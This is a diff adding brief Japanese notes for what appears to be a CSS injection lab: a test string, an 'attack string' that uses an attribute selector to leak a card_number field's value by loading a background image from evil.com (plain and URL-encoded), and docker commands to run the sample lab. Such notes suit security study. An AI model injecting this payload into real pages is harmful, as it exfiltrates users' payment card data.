@@ -1,0 +1,14 @@
+テスト用文字列：
+
+label{color%3A%23ff0000;}
+
+攻撃文字列：
+atturibute valueを取得する。
+
+#card_number[value^='1']{background-image:url(http://evil.com/?value=1);}
+#card_number%5Bvalue%5E%3D%271%27%5D%7Bbackground-image%3Aurl%28http%3A%2F%2Fevil.com%2F%3Fvalue%3D1%29%3B%7D
+
+docker run -d sample/1.0
+docker run -d -p 8080:80 -p 3306:3306 -v /var/www/html/:/var/www/html -v /var/lib/mysql:/var/lib/mysql sample:1.0
+
+docker run --rm -p 8080:80 -e LOG_STDOUT=true -e LOG_STDERR=true -e LOG_LEVEL=debug sample:2.0
